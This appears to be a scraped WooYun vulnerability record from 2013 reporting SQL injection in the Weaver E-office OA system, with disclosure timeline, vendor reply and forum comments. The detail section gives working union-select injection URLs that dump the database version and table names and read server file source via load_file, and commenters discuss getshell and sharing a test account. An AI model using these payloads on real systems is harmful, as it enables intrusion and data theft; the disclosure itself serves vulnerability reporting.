{"id": 9280, "wybug_id": "wooyun-2013-034523", "wybug_title": "泛微E-office OA管理系统存在SQL注射漏洞可查库", "wybug_corp": "上海泛微网络科技股份有限公司", "wybug_author": "applychen", "wybug_date": "2013-08-16 17:31", "wybug_open_date": "2013-09-30 17:31", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-30：\t细节向公众公开  简要描述： 还是OA系统，用户较多。 详细说明：  测试官方站点，首先用使用测试账户xj登录，然后访问下面的地址。\nhttp://eoffice8.weaver.cn:8028/general/file_folder/file_new/neworedit/index.php?FILE_SORT=&CONTENT_ID=123&SORT_ID=166&func_id=&operationType=editFromRead&docStr=\n其中的CONTENT_ID参数能够注射SQL语句。\nhttp://eoffice8.weaver.cn:8028/general/file_folder/file_new/neworedit/index.php?FILE_SORT=&CONTENT_ID=-4%20union%20select%201,2,3,4,5,version(),7,8,9,10,11,12,13,14,15,16,17,18,19%23&SORT_ID=166&func_id=&operationType=editFromRead&docStr=\n\n\n查询表名，这里的CONTENT_ID在每次查询时要变换值，不然程序提示信息被锁定：\nhttp://eoffice8.weaver.cn:8028/general/file_folder/file_new/neworedit/index.php?FILE_SORT=&CONTENT_ID=-5%20union%20select%201,2,3,4,5,group_concat(table_name),7,8,9,10,11,12,13,14,15,16,17,18,19%20from%20information_schema.tables%20where%20table_schema=database()%23&SORT_ID=166&func_id=&operationType=editFromRead&docStr=\n\n\n当然也可以load_file文件源码：\nhttp://eoffice8.weaver.cn:8028/general/file_folder/file_new/neworedit/index.php?FILE_SORT=&CONTENT_ID=-14%20union%20select%201,2,3,4,5,hex(load_file(0x443A5C656F6666696365382E336164765C776562726F6F745C6C6F67696E2E706870)),7,8,9,10,11,12,13,14,15,16,17,18,19%23&SORT_ID=166&func_id=&operationType=editFromRead&docStr=\n\n\n用16进制编辑器将上面load_file出来的内容保存，然后再zend解密，得到login.php源码：\n\n   漏洞证明：  同上   修复方案：  建议在include的公共文件里面添加IDS   版权声明：转载请注明来源 applychen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2013-08-20 22:53 厂商回复： CNVD在官方demo上确认所述情况，对于通用性还需要进一步确认。商请白帽子协同对通用性进行研究，现在仅差一些实例或本地验证情况，目前CNVD暂未找到实例复现。先行确认，rank 14 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-17 07:15 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  dz、咱们私信聊吧，我看我测试的是不是跟你这个oa系统是一个。。。如果一个，我能告诉你还能getshell么？    \n     2013-08-17 13:22 |    \t\tYwiSax \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:4        | 淡定。)\t\t \n  = = 话说最近刚想对这oa开撸。。。    \n     2013-08-21 00:59 |    \t\tapplychen \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:16        | 白发现首)\t\t \n  啊，我是看他的客户案例挺多的，有空了研究下这套系统的搜索关键字……    \n     2013-10-05 10:56 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @applychen 你试用的账号密码还在不？我测试下是不存在我之前找的那些漏洞，望共享一下    \n     2013-11-26 18:55 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  @Coody 求私信getshell    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}